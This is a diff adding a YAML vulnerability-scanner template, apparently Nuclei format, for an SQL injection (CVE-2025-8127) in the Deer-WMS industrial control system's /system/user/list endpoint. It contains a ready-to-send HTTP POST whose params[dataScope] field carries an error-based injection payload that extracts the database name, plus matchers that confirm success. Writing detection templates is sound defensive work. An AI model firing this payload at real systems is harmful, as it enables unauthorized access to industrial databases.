@@ -1,0 +1,31 @@
+id: deer-wms-ics-list-sql
+
+info:
+  name: Deer-WMS工控系统 list接口params[dataScope]参数SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    Deer-WMS工控系统在/system/user/list接口中，params[dataScope]参数未正确验证和过滤用户输入，允许攻击者通过构造恶意SQL命令执行未经授权的数据库操作。该漏洞可导致系统数据库中的敏感信息被非授权访问和提取。
+
+  reference:
+  - CVE-2025-8127
+  tags: Deer-WMS
+
+http:
+- raw:
+  - |
+    POST /system/user/list HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: JSESSIONID=5ffda3ab-8334-4505-8dc6-ed991f34df48
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'database'
